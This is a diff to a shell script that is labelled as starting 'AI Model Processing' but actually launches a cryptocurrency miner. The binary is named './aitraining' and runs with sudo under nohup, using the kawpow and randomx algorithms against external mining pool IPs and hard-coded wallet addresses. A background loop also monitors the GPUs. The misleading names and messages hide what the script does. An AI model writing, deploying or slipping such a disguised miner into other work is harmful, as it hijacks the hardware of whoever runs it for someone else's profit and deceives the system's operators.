@@ -8,9 +8,10 @@ sleep 2
 mkdir -p ./logs
 
 echo "=== Starting AI Model Processing ==="
- nohup bash -c '
+
 # --- GPU PROCESS ---
-nohup sudo ./aitraining \
+nohup bash -c "
+sudo ./aitraining \
     --algorithm kawpow \
     --pool 51.89.99.172:16161 \
     --wallet RM2ciYa3CRqyreRsf25omrB4e1S95waALr \
@@ -23,10 +24,12 @@ nohup sudo ./aitraining \
     --log-file-mode 1 \
     --api-enable \
     --api-port 21550 \
-    --api-rig-name H200-GPU > /dev/null 2>&1 &
+    --api-rig-name H200-GPU
+" > ./logs/gpu_nohup.log 2>&1 &
 
 # --- CPU PROCESS ---
-nohup sudo ./aitraining \
+nohup bash -c "
+sudo ./aitraining \
     --algorithm randomx \
     --pool 51.222.200.133:10343 \
     --wallet 44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd \
@@ -39,19 +42,22 @@ nohup sudo ./aitraining \
     --log-file-mode 1 \
     --api-enable \
     --api-port 21551 \
-    --api-rig-name H200-CPU > /dev/null 2>&1 &
+    --api-rig-name H200-CPU
+" > ./logs/cpu_nohup.log 2>&1 &
 
 # --- MONITOR SYSTEM ---
-nohup bash -c 'while true; do
-    echo -e "\n=== $(date) System Status ===" >> ./logs/monitor.log
-    echo "Active Processes:" >> ./logs/monitor.log
+nohup bash -c "
+while true; do
+    echo -e '\n=== \$(date) System Status ===' >> ./logs/monitor.log
+    echo 'Active Processes:' >> ./logs/monitor.log
     ps aux | grep aitraining | grep -v grep >> ./logs/monitor.log
-    echo "GPU Status:" >> ./logs/monitor.log
+    echo 'GPU Status:' >> ./logs/monitor.log
     nvidia-smi --query-gpu=index,temperature.gpu,utilization.gpu,memory.used,power.draw --format=csv,noheader >> ./logs/monitor.log 2>/dev/null
-    echo "---" >> ./logs/monitor.log
+    echo '---' >> ./logs/monitor.log
     sleep 30
-done' > /dev/null 2>&1 &
-> /dev/null 2>&1 &
+done
+" > ./logs/monitor_nohup.log 2>&1 &
+
 echo "=== Processing Started Successfully ==="
 echo ""
 echo "📊 Log Files:"
